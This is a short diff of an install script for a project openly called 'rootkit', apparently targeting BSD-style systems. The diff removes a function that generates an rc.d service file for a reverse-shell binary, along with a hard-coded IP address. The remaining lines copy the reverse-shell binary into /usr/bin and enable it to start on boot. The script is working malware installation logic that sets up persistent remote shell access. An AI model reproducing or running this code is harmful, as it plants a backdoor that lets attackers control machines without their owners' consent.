@@ -17,25 +17,6 @@
 # along with this program. If not, see <http://www.gnu.org/licenses/>.
 #
 
-write_to_rc_conf()
-{	
-	echo $1 >> $BINARIES/rshell
-}
-
-populate_rc_conf_file()
-{
-	write_to_rc_conf "#!/bin/sh"
-	write_to_rc_conf "# PROVIDE: rshell"
-	write_to_rc_conf "REMOTE=${REMOTE}"
-	write_to_rc_conf "name=\"$RSHELL_CONF_FILE\""
-	write_to_rc_conf "rcvar=\`set_rcvar\`"
-	write_to_rc_conf "start_cmd=\"/usr/bin/rshell_target\""
-	write_to_rc_conf "stop_cmd=\":\""
-	write_to_rc_conf "\r\n"
-	write_to_rc_conf "load_rc_config \$name"
-	write_to_rc_conf "\"\$1\""
-}
-
 SRC=$(dirname "$(realpath $0)")
 
 NAME="rootkit"
@@ -84,7 +65,6 @@ cp $BINARIES/$RSHELL_BIN $USR_BIN/
 echo ">> Enable reverse-shell on boot."
 echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RSHELL_CONF
 
-SAMPLE = "188.102.103.192"
 echo ">> Move configuration file into rc."
 cp $BINARIES/$RSHELL_CONF_FILE $RSHELL_INSTALL
 
